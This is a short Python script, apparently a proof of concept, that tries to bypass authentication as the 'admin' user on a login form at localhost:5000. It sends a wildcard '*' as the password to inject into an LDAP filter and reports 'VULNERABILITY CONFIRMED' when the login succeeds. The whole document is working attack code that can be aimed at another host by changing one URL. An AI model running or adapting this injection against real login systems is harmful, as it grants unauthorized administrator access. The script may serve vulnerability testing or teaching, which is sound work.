import requests
import sys

# --- Configuration ---
# GOAL: Bypass authentication for the 'admin' user
BASE_URL = "http://localhost:5000"
TARGET_USER = "admin"

def verify_bypass(url, user):
    """
    Attempts to log in using the Wildcard (*) injection technique.
    """
    print(f"[*] Target: {url}")
    print(f"[*] Attempting Bypass for User: {user}")

    # 1. Construct Payload
    # We send the username normally, but inject '*' into the password.
    # Resulting Filter: (&(cn=admin)(userPassword=*))
    data = {
        "username": user,
        "password": "*" 
    }

    # 2. Execute Attack
    response = requests.post(url, data=data)

    # 3. Verify Result
    # The app returns "LOGIN SUCCESS" if the LDAP server validates the query.
    if "LOGIN SUCCESS" in response.text:
        print("\n[+] VULNERABILITY CONFIRMED")
        print("[+] Bypass Successful!")
        print(f"[+] Server Response Snippet: {response.text[0:100]}...") # Show proof
        return True
    else:
        print("\n[-] Bypass Failed. Application might be patched.")
        return False


if __name__ == "__main__":
    verify_bypass(BASE_URL, TARGET_USER)